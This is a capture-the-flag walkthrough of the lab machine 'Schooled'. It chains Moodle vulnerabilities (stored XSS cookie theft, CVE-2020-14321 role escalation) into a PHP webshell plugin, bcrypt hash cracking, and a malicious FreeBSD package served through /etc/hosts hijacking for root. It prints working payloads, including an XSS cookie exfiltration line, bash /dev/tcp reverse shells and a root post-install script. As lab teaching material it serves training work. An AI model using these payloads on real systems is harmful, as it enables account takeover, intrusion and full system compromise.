<h2 id="executive-summary">Executive Summary</h2>
<p>Schooled is a <strong>FreeBSD</strong> machine running an <strong>Apache/PHP</strong> web server with a <strong>Moodle 3.9</strong> learning management system. The attack path follows a classic "escalation of privileges within an application" pattern:</p>
<ol>
<li><strong>External Recon</strong> → Discover a Moodle subdomain</li>
<li><strong>Application Recon</strong> → Register as a student, find XSS, steal a teacher's cookie</li>
<li><strong>Application PrivEsc</strong> → Abuse a Moodle enrollment vulnerability (CVE-2020-14321) to promote a teacher to Manager</li>
<li><strong>Manager PrivEsc</strong> → Tamper with role permissions to gain plugin upload rights</li>
<li><strong>Code Execution</strong> → Upload a malicious Moodle plugin → reverse shell as <code>www</code></li>
<li><strong>Lateral Movement</strong> → Extract MySQL credentials from <code>config.php</code>, dump password hashes, crack Jamie's bcrypt hash</li>
<li><strong>SSH Access</strong> → Log in as <code>jamie</code>, grab user flag</li>
<li><strong>Privilege Escalation</strong> → Abuse <code>sudo pkg update/install *</code> + writable <code>/etc/hosts</code> to serve a malicious FreeBSD package</li>
<li><strong>Root</strong> → Install the malicious package, get a root shell, grab root flag</li>
</ol>
<hr>
<h2 id="phase-1-reconnaissance-and-enumeration">Phase 1: Reconnaissance &amp; Enumeration</h2>
<h3 id="step-1-1-update-etc-hosts">Step 1.1: Update <code>/etc/hosts</code></h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">sudo bash -c 'echo "10.129.96.53 schooled.htb moodle.schooled.htb student.schooled.htb devops.htb" &gt;&gt; /etc/hosts'
</code></pre>
<p>When you visit a website by IP address, the server's virtual host configuration often routes you to a default page. Many web applications rely on the <code>Host:</code> header to serve the correct content. If you don't map the domain names to the IP, you might miss entire applications or subdomains. Additionally, if the application generates absolute URLs (e.g., redirects to <code>schooled.htb</code>), your browser needs to resolve that name.</p>


<hr>
<h3 id="step-1-2-nmap-scan">Step 1.2: Nmap Scan</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">nmap -sC -sV -p- --min-rate 10000 10.129.96.53 -oA schooled_nmap
</code></pre>
<p><strong>Results:</strong></p>
<ul>
<li><code>22/tcp</code> : OpenSSH 7.9 (FreeBSD)</li>
<li><code>80/tcp</code> : Apache 2.4.46 (FreeBSD) PHP/7.4.15</li>
<li><code>33060/tcp</code> : MySQL X protocol listener</li>
</ul>
<p>The open ports tell us the attack surface. Port 22 means we might eventually get SSH access. Port 80 is our initial entry point. Port 33060 confirms MySQL is running (likely backing the web app). The <code>FreeBSD</code> OS is critical information for later - we can't use Linux privilege escalation techniques; we need FreeBSD-specific ones.</p>


<hr>
<h3 id="step-1-3-vhost-brute-force">Step 1.3: VHost Brute Force</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">wfuzz -u http://10.129.96.53 -H "Host: FUZZ.schooled.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 20750
</code></pre>
<p><strong>Result:</strong> <code>moodle</code> subdomain found (response 200, different size).</p>
<p>Modern web infrastructure often hosts multiple applications on the same IP address. The main site (<code>schooled.htb</code>) might be a static marketing page, while <code>moodle.schooled.htb</code> is a fully functional application with authentication, file uploads, and a database backend. Missing the subdomain means missing the entire attack surface.</p>


<hr>
<h3 id="step-1-4-explore-moodle">Step 1.4: Explore Moodle</h3>
<p><strong>URL:</strong> <code>http://moodle.schooled.htb</code></p>
<p><strong>Observations:</strong></p>
<ul>
<li>Moodle 3.9 instance</li>
<li>Teachers page at <code>/teachers.html</code> lists staff members</li>
<li>Registration is open but requires <code>@student.schooled.htb</code> email</li>
<li>Mathematics course offers "self enrollment"</li>
</ul>
<p>Moodle is a complex PHP application with a history of vulnerabilities. Knowing the version (3.9) allows us to search for CVEs specific to that version. The self-enrollment feature means we can get a legitimate account inside the application. The teachers page gives us targets for social engineering or automated exploitation.</p>

<h2 id="phase-2-initial-foothold-via-moodle">Phase 2: Initial Foothold via Moodle</h2>
<h3 id="step-2-1-register-a-student-account">Step 2.1: Register a Student Account</h3>
<p><strong>Account Details:</strong></p>
<ul>
<li>Username: <code>hacker</code></li>
<li>Email: <code>hacker@student.schooled.htb</code></li>
<li>Password: <code>REDACTED</code></li>
</ul>
<p>You need an authenticated session to interact with Moodle's features. The email restriction (<code>@student.schooled.htb</code>) is a client-side or simple server-side check. Since we control the DNS resolution and the domain isn't actually sending emails, we can use any fake address. The "confirm email" link is displayed on-screen after registration - no actual email verification occurs.</p>


<hr>
<h3 id="step-2-2-enroll-in-mathematics">Step 2.2: Enroll in Mathematics</h3>
<p><strong>Path:</strong> Mathematics → Enrol me in this course</p>
<p>The Mathematics course has an "Announcements" forum. One announcement states that all students must have a MoodleNet profile. This is a <strong>hint</strong> - the teacher (Manuel Phillips) will likely check student profiles. If we can inject malicious content into our profile, we can attack whoever views it (stored XSS).</p>


<hr>
<h3 id="step-2-3-steal-manuel-s-cookie-via-stored-xss-cve-2020-25627">Step 2.3: Steal Manuel's Cookie via Stored XSS (CVE-2020-25627)</h3>
<p><strong>Vulnerability:</strong> Stored XSS via <code>moodlenetprofile</code> parameter<br><strong>CVE:</strong> CVE-2020-25627 / MSA-20-0011</p>
<p><strong>Payload placed in "MoodleNet profile" field:</strong></p>
<pre><code class="language-html" data-language="html">&lt;img src=x onerror="this.src='http://10.10.16.84/?c='+document.cookie; this.removeAttribute('onerror');"&gt;
</code></pre>
<p><strong>Listener on Kali:</strong></p>
<pre><code class="language-bash" data-language="bash">sudo python3 -m http.server 80
</code></pre>
<p><strong>Result:</strong> After ~1-2 minutes, the target IP (<code>10.129.96.53</code>) makes a request to your Kali box:</p>
<pre><code>10.129.96.53 - - [29/May/2026 07:54:01] "GET /?c=MoodleSession=cv3ku6rsh04qki4bjonf9fffkk HTTP/1.1" 200 -
</code></pre>
<p>This is a <strong>stored XSS</strong> triggered by an automated user (Manuel Phillips, the Mathematics teacher). The MoodleNet profile field doesn't properly sanitize HTML/JS input. When Manuel views your profile, his browser executes the JavaScript, which exfiltrates his session cookie to your attacker server. With his session cookie, you become him.</p>


<hr>
<h3 id="step-2-4-become-manuel-phillips">Step 2.4: Become Manuel Phillips</h3>
<p><strong>In Browser (Developer Tools → Storage → Cookies):</strong></p>
<ul>
<li>Replace your <code>MoodleSession</code> cookie with the stolen one</li>
<li>Refresh <code>http://moodle.schooled.htb</code></li>
</ul>
<p><strong>Verification:</strong> Top-right corner shows "Manuel Phillips".</p>
<p>Session cookies grant account access. In web applications, the cookie is often the only thing standing between an attacker and the victim's account. By swapping cookies, we completely bypass authentication - no password cracking, no phishing, just pure session hijacking.</p>


<hr>
<h3 id="step-2-5-privilege-escalation-to-manager-cve-2020-14321">Step 2.5: Privilege Escalation to Manager (CVE-2020-14321)</h3>
<p><strong>Vulnerability:</strong> Course enrolments allowed privilege escalation from teacher role into manager role<br><strong>CVE:</strong> CVE-2020-14321 / MSA-20-0009</p>
<p><strong>The Problem:</strong><br>Manuel is a <strong>Teacher</strong> in the Math course. Teachers can enroll users, but they shouldn't be able to assign the <strong>Manager</strong> role. The enrollment AJAX request sends <code>roletoassign=5</code> (Student) by default. If we intercept the request and change it to <code>roletoassign=1</code> (Manager), the server accepts it without proper authorization checks.</p>
<p><strong>Step-by-Step:</strong></p>
<ol>
<li>Go to Mathematics → Participants → Enrol users</li>
<li>In the popup, type "Lianne Carter" (she's already a Manager at the site level)</li>
<li>Turn on Burp Intercept</li>
<li>Click "Enrol users"</li>
<li><strong>Modify the intercepted GET request:</strong><ul>
<li>Change <code>userlist%5B%5D=25</code> (Lianne) → <code>userlist%5B%5D=24</code> (Manuel)</li>
<li>Change <code>roletoassign=5</code> → <code>roletoassign=1</code></li>
</ul>
</li>
<li>Forward the request</li>
<li>Manuel now has the <strong>Manager</strong> role in the Math course</li>
</ol>
<p><strong>But wait - there's a cron job</strong> that resets the class list every ~1 minute. If Manuel loses Manager, re-send the request from Burp Repeater.</p>
<p>This is a <strong>horizontal privilege escalation</strong> within the application. We're not exploiting a memory corruption bug; we're abusing a business logic flaw. The server trusts the client to send a valid <code>roletoassign</code> value and doesn't verify that the requesting user (a Teacher) is authorized to assign Manager roles.</p>


<hr>
<h3 id="step-2-6-enroll-lianne-carter-as-manager">Step 2.6: Enroll Lianne Carter as Manager</h3>
<p><strong>Repeat the same request but with <code>userlist%5B%5D=25</code> (Lianne) and <code>roletoassign=1</code>.</strong></p>
<p>With <strong>both</strong> Manuel and Lianne as Managers in the Math course, you can click on Lianne's profile and see a <strong>"Log in as"</strong> link. This allows you to impersonate Lianne Carter, who is already a Manager at the site level. This is critical because site-level Managers have access to Site Administration, which is our path to plugin installation.</p>


<hr>
<h3 id="step-2-7-click-log-in-as-lianne-carter">Step 2.7: Click "Log in as" Lianne Carter</h3>
<p><strong>Path:</strong> Mathematics Participants → Click Lianne Carter → "Log in as"</p>
<p>Lianne has site-wide Manager privileges. You are now effectively a Manager. However, Managers still can't install plugins by default. You need to modify the Manager role to grant full permissions.</p>


<hr>
<h3 id="step-2-8-enable-full-manager-permissions">Step 2.8: Enable Full Manager Permissions</h3>
<p><strong>Path:</strong> Site administration → Users → Permissions → Define roles → Manager → Edit</p>
<p><strong>The Trick:</strong><br>The Manager role has thousands of checkboxes. You can't manually check them all before the page times out or the cron resets. Instead:</p>
<ol>
<li>Scroll to the bottom and click <strong>"Save changes"</strong></li>
<li>Intercept the POST request in Burp</li>
<li>Send to Repeater</li>
<li>Use <strong>Find/Replace</strong> in the request body: replace all <code>=0</code> with <code>=1</code></li>
<li>Send the modified request</li>
</ol>
<p>The Manager role is intentionally restricted from installing plugins (a security boundary). By tampering with the role-save request, we're exploiting the fact that the server accepts arbitrary permission values from the client. We're not exploiting a buffer overflow - we're simply telling the server "yes, the Manager can do everything," and the server believes us.</p>


<hr>
<h3 id="step-2-9-upload-malicious-plugin-webshell">Step 2.9: Upload Malicious Plugin → Webshell</h3>
<p><strong>Create <code>rce.zip</code> on Kali:</strong></p>
<pre><code class="language-bash" data-language="bash">cd ~
mkdir -p rce/lang/en
cat &gt; rce/version.php &lt;&lt; 'EOF'
&lt;?php 
$plugin-&gt;version = 2020061700;
$plugin-&gt;component = 'block_rce';
?&gt;
EOF
cat &gt; rce/lang/en/block_rce.php &lt;&lt; 'EOF'
&lt;?php system($_GET['cmd']); ?&gt;
EOF
zip -r rce.zip rce/
</code></pre>
<p><strong>Upload Path:</strong> Site administration → Plugins → Install plugins → Choose <code>rce.zip</code></p>
<p><strong>Webshell Location:</strong></p>
<pre><code>http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id
</code></pre>
<p>Moodle plugins are ZIP files containing PHP code. When you upload a plugin, Moodle extracts it to <code>/moodle/blocks/rce/</code>. The language file (<code>block_rce.php</code>) is a PHP file that gets executed by the web server. By embedding <code>system($_GET['cmd'])</code>, we turn the language file into a web shell.</p>


<hr>
<h3 id="step-2-10-reverse-shell-as-www">Step 2.10: Reverse Shell as www</h3>
<p><strong>Listener on Kali:</strong></p>
<pre><code class="language-bash" data-language="bash">nc -lnvp 4444
</code></pre>
<p><strong>Trigger:</strong></p>
<pre><code class="language-bash" data-language="bash">curl -G --data-urlencode "cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1'" http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php
</code></pre>
<p><strong>Upgrade the shell:</strong></p>
<pre><code class="language-bash" data-language="bash">/usr/local/bin/python3 -c 'import pty;pty.spawn("bash")'
# Ctrl+Z
stty raw -echo; fg
reset
</code></pre>
<p>A webshell is fine for one-off commands, but it's slow and fragile. A reverse shell gives you an interactive session where you can run complex commands, navigate the filesystem, and maintain persistence. Upgrading to a TTY shell gives you job control, command history, and proper terminal behavior.</p>

<h2 id="phase-3-from-www-to-jamie-user-flag">Phase 3: From www to Jamie (User Flag)</h2>
<h3 id="step-3-1-find-database-credentials">Step 3.1: Find Database Credentials</h3>
<p><strong>File:</strong> <code>/usr/local/www/apache24/data/moodle/config.php</code></p>
<p><strong>Contents:</strong></p>
<pre><code class="language-php" data-language="php">$CFG-&gt;dbtype    = 'mysqli';
$CFG-&gt;dbhost    = 'localhost';
$CFG-&gt;dbname    = 'moodle';
$CFG-&gt;dbuser    = 'moodle';
$CFG-&gt;dbpass    = 'PlaybookMaster2020';
$CFG-&gt;prefix    = 'mdl_';
</code></pre>
<p>Web applications almost always store their database credentials in a configuration file. On Linux, this is typically <code>/var/www/html/</code>; on FreeBSD, it's <code>/usr/local/www/apache24/data/</code>. Finding the config file gives us direct access to the application's data layer - every user, every hash, every secret.</p>


<hr>
<h3 id="step-3-2-dump-user-password-hashes">Step 3.2: Dump User Password Hashes</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">/usr/local/bin/mysql -u moodle -pREDACTED moodle
</code></pre>
<p><strong>Query:</strong></p>
<pre><code class="language-sql" data-language="sql">SELECT username, email, password FROM mdl_user;
</code></pre>
<p><strong>Key Finding:</strong></p>
<table aria-label="Step 3.2: Dump User Password Hashes data table">
<thead>
<tr>
<th scope="col">username</th>
<th scope="col">email</th>
<th scope="col">password</th>
</tr>
</thead>
<tbody><tr>
<td>admin</td>
<td><a href="mailto:jamie@staff.schooled.htb">jamie@staff.schooled.htb</a></td>
<td><code>REDACTED_PASSWORD_HASH</code></td>
</tr>
</tbody></table>
<p>The <code>admin</code> account has an email address <code>jamie@staff.schooled.htb</code>, strongly suggesting this is Jamie's account. The password hash is <code>$2y$10$...</code>, which is <strong>bcrypt</strong> (mode 3200 in Hashcat). By cracking this hash, we can SSH in as Jamie.</p>


<hr>
<h3 id="step-3-3-crack-jamie-s-hash">Step 3.3: Crack Jamie's Hash</h3>
<p><strong>Hashcat Command:</strong></p>
<pre><code class="language-bash" data-language="bash">echo 'admin:REDACTED_PASSWORD_HASH' &gt; hash.txt
hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
</code></pre>
<p><strong>Result:</strong> <code>!QAZ2wsx</code></p>
<p>Bcrypt is slow, but if the password is in a common wordlist like <code>rockyou.txt</code>, it will eventually fall. The password <code>REDACTED</code> is a keyboard pattern (top-left column shifted) - a common weak password that humans choose because it's easy to type.</p>


<hr>
<h3 id="step-3-4-ssh-as-jamie-and-grab-user-flag">Step 3.4: SSH as Jamie &amp; Grab User Flag</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">sshpass -p REDACTED ssh jamie@10.129.96.53
</code></pre>
<p><strong>User Flag:</strong></p>
<pre><code class="language-bash" data-language="bash">cat ~/user.txt
</code></pre>
<p><strong>Result:</strong> <code>4d23ef7[redacted]b5e18815</code></p>
<p>Now we have a stable, interactive shell as a real user (not just a web server account). User accounts have home directories, SSH keys, personal files, and often different sudo privileges than the web server user.</p>


<hr>
<h2 id="phase-4-from-jamie-to-root-root-flag">Phase 4: From Jamie to Root (Root Flag)</h2>
<h3 id="step-4-1-enumerate-sudo-privileges">Step 4.1: Enumerate sudo Privileges</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">sudo -l
</code></pre>
<p><strong>Result:</strong></p>
<pre><code>User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
</code></pre>
<p><code>pkg</code> is the FreeBSD package manager. The <code>*</code> wildcard in <code>pkg install *</code> means Jamie can install ANY package. This is dangerous because package installation scripts run as root. If we can make <code>pkg</code> install a package we control, we can execute arbitrary code as root.</p>


<hr>
<h3 id="step-4-2-understand-the-pkg-configuration">Step 4.2: Understand the pkg Configuration</h3>
<p><strong>File:</strong> <code>/etc/pkg/FreeBSD.conf</code></p>
<p><strong>Contents:</strong></p>
<pre><code class="language-yaml" data-language="yaml">FreeBSD: {
  url: "pkg+http://devops.htb:80/packages",
  mirror_type: "srv",
  signature_type: "none",
  fingerprints: "/usr/share/keys/pkg",
  enabled: yes
}
</code></pre>
<p><strong>File:</strong> <code>/etc/hosts</code></p>
<p><strong>Contents:</strong></p>
<pre><code>192.168.1.14            devops.htb
</code></pre>
<p><code>pkg update</code> fetches package metadata from <code>http://devops.htb/packages/</code>. <code>devops.htb</code> resolves to <code>192.168.1.14</code> via <code>/etc/hosts</code>. If we change <code>/etc/hosts</code> to point <code>devops.htb</code> to our Kali machine, <code>pkg</code> will fetch metadata from us instead of the real server. Since <code>signature_type: "none"</code>, there's no cryptographic verification to stop us.</p>


<hr>
<h3 id="step-4-3-check-etc-hosts-writability">Step 4.3: Check /etc/hosts Writability</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">ls -l /etc/hosts
id
</code></pre>
<p><strong>Result:</strong></p>
<pre><code>-rw-rw-r--  1 root  wheel  1098 Mar 17  2021 /etc/hosts
uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel)
</code></pre>
<p>Jamie is in the <code>wheel</code> group, and <code>/etc/hosts</code> is group-writable (<code>rw-rw-r--</code>). This means Jamie can directly modify <code>/etc/hosts</code> <strong>without sudo</strong>. This is the critical bridge between "pkg install as root" and "trick pkg into talking to us."</p>


<hr>
<h3 id="step-4-4-create-the-malicious-freebsd-package">Step 4.4: Create the Malicious FreeBSD Package</h3>
<p><strong>On the target (as jamie):</strong></p>
<pre><code class="language-bash" data-language="bash">mkdir -p /tmp/root/usr/local/etc
cat &gt; /tmp/root/+MANIFEST &lt;&lt; 'EOF'
name: "root"
version: "1.0"
origin: sysutils/root
comment: "root"
desc: "root"
maintainer: root@schooled.htb
www: https://root.htb
prefix: /
EOF
cat &gt; /tmp/root/+POST_INSTALL &lt;&lt; 'EOF'
#!/bin/sh
bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/5555 0&gt;&amp;1'
EOF
chmod +x /tmp/root/+POST_INSTALL
echo "# root" &gt; /tmp/root/usr/local/etc/root.conf
echo "/usr/local/etc/root.conf" &gt; /tmp/root/plist
cd /tmp/root
pkg create -m /tmp/root -r /tmp/root -p /tmp/root/plist -o .
</code></pre>
<p>FreeBSD packages (<code>.txz</code> files) are tar archives with metadata. The <code>+POST_INSTALL</code> script runs <strong>as root</strong> after the package files are extracted. By embedding a bash reverse shell in the post-install script, we ensure that the moment <code>pkg install</code> runs, a root shell connects back to our listener.</p>
<p><strong>Key Components:</strong></p>
<ul>
<li><code>+MANIFEST</code> : Package metadata (name, version, origin, etc.)</li>
<li><code>+POST_INSTALL</code> : Shell script executed by pkg as root after installation</li>
<li><code>usr/local/etc/root.conf</code> : A dummy file the package "installs" (required for pkg create)</li>
<li><code>plist</code> : Lists the files the package owns</li>
</ul>


<hr>
<h3 id="step-4-5-transfer-package-files-to-kali">Step 4.5: Transfer Package Files to Kali</h3>
<p><strong>On the target, serve the files:</strong></p>
<pre><code class="language-bash" data-language="bash">cd /tmp/root
/usr/local/bin/python3 -m http.server 8080
</code></pre>
<p><strong>On Kali, download them:</strong></p>
<pre><code class="language-bash" data-language="bash">cd ~
mkdir -p packages
wget http://10.129.96.53:8080/packagesite.txz -O packages/packagesite.txz
wget http://10.129.96.53:8080/meta.conf -O packages/meta.conf
wget http://10.129.96.53:8080/meta.txz -O packages/meta.txz
wget http://10.129.96.53:8080/root-1.0.txz -O packages/root-1.0.txz
</code></pre>
<p><strong>On Kali, host the repo:</strong></p>
<pre><code class="language-bash" data-language="bash">cd ~
sudo python3 -m http.server 80
</code></pre>
<p><code>pkg update</code> expects a specific repo structure:</p>
<ul>
<li><code>/packages/meta.conf</code> : Repo configuration</li>
<li><code>/packages/meta.txz</code> : Compressed repo metadata</li>
<li><code>/packages/packagesite.txz</code> : Package catalog</li>
<li><code>/packages/root-1.0.txz</code> : The actual package file</li>
</ul>
<p>By hosting these files from our Kali machine, we create a fake package repository that <code>pkg</code> will trust and fetch from.</p>


<hr>
<h3 id="step-4-6-edit-etc-hosts-and-install-the-package">Step 4.6: Edit /etc/hosts and Install the Package</h3>
<p><strong>On the target:</strong></p>
<pre><code class="language-bash" data-language="bash">cat /etc/hosts | sed 's/192.168.1.14/10.10.16.84/' &gt; /tmp/hosts.new &amp;&amp; cat /tmp/hosts.new &gt; /etc/hosts
</code></pre>
<p><strong>Why <code>sed -i ''</code> fails on FreeBSD:</strong><br>FreeBSD <code>sed</code> requires <code>-i ''</code> (with an empty string) for in-place editing, or it treats the next argument as a backup suffix. Even then, it tries to create a temp file in <code>/etc</code>, which isn't writable. Using <code>cat</code> and redirect is safer.</p>
<p><strong>Important:</strong> A cron job resets <code>/etc/hosts</code> roughly every minute. You must change it and run <code>pkg</code> <strong>immediately</strong>.</p>
<p><strong>Run pkg:</strong></p>
<pre><code class="language-bash" data-language="bash">sudo pkg update
sudo pkg install root
</code></pre>
<p><code>pkg update</code> fetches <code>meta.conf</code> and <code>packagesite.txz</code> from our Kali box (now pretending to be <code>devops.htb</code>). <code>pkg install root</code> downloads <code>root-1.0.txz</code> and executes the <code>+POST_INSTALL</code> script - <strong>as root</strong>.</p>


<hr>
<h3 id="step-4-7-root-shell-and-root-flag">Step 4.7: Root Shell &amp; Root Flag</h3>
<p><strong>Listener on Kali:</strong></p>
<pre><code class="language-bash" data-language="bash">nc -lnvp 5555
</code></pre>
<p><strong>Result:</strong></p>
<pre><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.96.53] 50393
bash: cannot set terminal process group (7139): Can't assign requested address
bash: no job control in this shell
[root@Schooled /tmp/root]# id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
</code></pre>
<p><strong>Root Flag:</strong></p>
<pre><code class="language-bash" data-language="bash">cat /root/root.txt
</code></pre>
<p><strong>Result:</strong> <code>53fef09[redacted]be7abe21</code></p>
<p>The <code>+POST_INSTALL</code> script ran as root because <code>sudo pkg install</code> spawns the pkg process with root privileges. The script's bash reverse shell inherited those privileges, giving us a root shell. We bypassed traditional privilege escalation (kernel exploits, SUID binaries) by weaponizing the package manager itself.</p>


<hr>
<h2 id="review-notes">Review notes</h2>
<h3 id="1-enumeration-is-exploitation">1. Enumeration Is Exploitation</h3>
<p>Every subdomain, every email address, every announcement, and every open port is a piece of the puzzle. The time you spend enumerating is never wasted - it defines the entire attack path.</p>
<h3 id="2-trust-the-hints">2. Trust the Hints</h3>
<p>When a box says "the teacher checks profiles," believe it. When you see <code>sudo pkg install *</code>, respect the wildcard. Developers and CTF creators leave breadcrumbs intentionally.</p>
<h3 id="3-chain-your-exploits">3. Chain Your Exploits</h3>
<p>Rarely does one vulnerability give you everything. Schooled required: XSS → Cookie Theft → Role Escalation → Permission Tampering → Plugin Upload → Webshell → Database Access → Hash Cracking → SSH → Package Manager Abuse → Root. Each step was small; the chain was devastating.</p>
<h3 id="4-abuse-business-logic">4. Abuse Business Logic</h3>
<p>Not all bugs are buffer overflows. CVE-2020-14321 was a business logic flaw: a teacher could assign a Manager role because the server didn't validate the request. These bugs are invisible to automated scanners but are often more reliable than memory corruption.</p>
<h3 id="5-weaponize-legitimate-features">5. Weaponize Legitimate Features</h3>
<p>Package managers exist to install software. When you can control what they install, they become remote code execution engines. Always ask: "What trusted mechanism can I trick into running my code?"</p>
<h3 id="6-time-your-moves">6. Time Your Moves</h3>
<p>When cron jobs reset state (class enrollments, plugins, <code>/etc/hosts</code>), speed becomes a weapon. Chain commands with <code>&amp;&amp;</code>, use Repeater for rapid-fire requests, and don't wait for page refreshes - act on the backend state, not the frontend display.</p>
<h3 id="7-os-matters">7. OS Matters</h3>
<p>FreeBSD isn't Linux. Python lives at <code>/usr/local/bin/python3</code>. The web root is <code>/usr/local/www/apache24/data/</code>. <code>sed</code> behaves differently. If you treat FreeBSD like Linux, you'll fail. Always adapt your tooling to the target's dialect.</p>
